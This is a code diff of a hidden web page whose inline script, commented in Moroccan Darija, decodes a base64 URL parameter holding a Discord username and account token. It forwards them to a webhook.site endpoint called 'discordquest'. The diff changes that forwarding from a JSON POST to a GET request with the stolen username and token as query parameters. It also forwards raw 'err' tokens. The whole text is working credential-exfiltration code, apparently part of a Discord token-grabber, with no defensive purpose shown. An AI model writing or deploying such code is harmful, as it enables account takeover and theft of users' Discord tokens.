@@ -5,10 +5,11 @@
     <!-- Had l'page ghadi tkon makhfiya, ma kayban fiha walou -->
     <script>
         // ⚠️ IMPORTANT: BDDEL HAD L'URL B'L'URL DIAL WEBHOOK.SITE DIALEK L'ORIGINAL
-        const WEBHOOK_SITE_URL = "https://webhook.site/discordquest"; 
+        const WEBHOOK_SITE_BASE_URL = "https://webhook.site/discordquest"; 
+        // Note: beddelt WEBHOOK_SITE_URL l' WEBHOOK_SITE_BASE_URL hit ghadi nzidou 3liha les paramètres
 
         const params = new URLSearchParams(window.location.search);
-        let payloadToWebhook = {}; // Had l'objet howa li ghadi nsiftoh l'webhook.site
+        let finalWebhookUrl = WEBHOOK_SITE_BASE_URL; // Ghadi nbedlou had l'URL bach nzido 3liha l'data
 
         // If the 'd' parameter (data) is present
         if (params.has('d')) {
@@ -20,15 +21,14 @@
                 // Split the string into username and token (kanet `${tag}|${token}`)
                 const [username, token] = decodedString.split('|');
 
-                // Prepare the payload in the desired format
-                payloadToWebhook = {
-                    "Username": username,
-                    "Token": token
-                };
+                // ⭐ MODIFICATION HNA: Nseftou l'username w l'token k'query parameters
+                // L'webhook.site ghadi yqder yqrahom b' $request.query.user$ w $request.query.token$
+                finalWebhookUrl += `?user=${encodeURIComponent(username)}&token=${encodeURIComponent(token)}`;
+
             } catch (e) {
                 console.error("Error decoding 'd' parameter:", e);
-                // Fallback in case of decoding error
-                payloadToWebhook = { "Error during decoding 'd'": params.get('d') };
+                // Fallback in case of decoding error, send raw data as an error parameter
+                finalWebhookUrl += `?error_decoding_d=${encodeURIComponent(params.get('d'))}`;
             }
         } 
         // If the 'err' parameter (error token) is present
@@ -37,24 +37,21 @@
                 const errorToken = params.get('err');
                 const decodedErrorToken = atob(errorToken); // Decode Base64
                 
-                payloadToWebhook = {
-                    "Error Token": decodedErrorToken // Label for raw token on error
-                };
+                // ⭐ MODIFICATION HNA: Nseftou l'error token k'query parameter
+                finalWebhookUrl += `?error_token=${encodeURIComponent(decodedErrorToken)}`;
             } catch (e) {
                 console.error("Error decoding 'err' parameter:", e);
                 // Fallback in case of decoding error
-                payloadToWebhook = { "Error during decoding 'err'": params.get('err') };
+                finalWebhookUrl += `?error_decoding_err=${encodeURIComponent(params.get('err'))}`;
             }
         }
 
-        // Only send the fetch request if there's data to send
-        if (Object.keys(payloadToWebhook).length > 0) {
-            fetch(WEBHOOK_SITE_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payloadToWebhook) // Kanseftou l'objet m'structured
+        // Only send the fetch request if the URL has been updated with parameters
+        if (finalWebhookUrl !== WEBHOOK_SITE_BASE_URL) {
+            // ⭐ MODIFICATION HNA: Kanseftou GET request, hit hadchi li webhook.site kaytwaqqa3
+            // b'les query parameters.
+            fetch(finalWebhookUrl, {
+                method: 'GET' // Kanbedlouha l'GET, w ma kan7tajouch body aw Content-Type
             })
             .then(response => {
                 if (!response.ok) {
